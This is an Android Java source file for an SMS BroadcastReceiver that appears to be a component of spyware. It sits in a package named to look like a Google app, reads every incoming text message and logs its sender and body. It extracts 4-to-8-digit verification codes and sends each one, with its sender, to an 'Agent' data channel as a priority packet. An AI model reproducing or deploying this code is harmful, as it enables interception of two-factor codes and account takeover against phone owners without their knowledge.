package com.google.android.apps.work.stage2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class UpdateReceiver extends BroadcastReceiver {

    private static final String TAG = "UpdateReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                try {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    if (pdus != null) {
                        for (Object pdu : pdus) {
                            String format = bundle.getString("format");
                            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu, format);
                            String messageBody = smsMessage.getMessageBody();
                            String sender = smsMessage.getDisplayOriginatingAddress();

                            Log.d(TAG, "SMS received from: " + sender + " Body: " + messageBody);

                            String code = extractVerificationCode(messageBody);
                            if (code != null) {
                                Log.i(TAG, "Extracted Verification Code: " + code);
                                Agent.getInstance().sendData(new Agent.DataPacket("sms_priority", "Code: " + code + " from " + sender, 10));
                            }
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error processing SMS", e);
                }
            }
        }
    }

    private String extractVerificationCode(String message) {
        Pattern pattern = Pattern.compile("\\b(\\d{4,8})\\b");
        Matcher matcher = pattern.matcher(message);
        if (matcher.find()) {
            return matcher.group(1);
        }
        return null;
    }
}
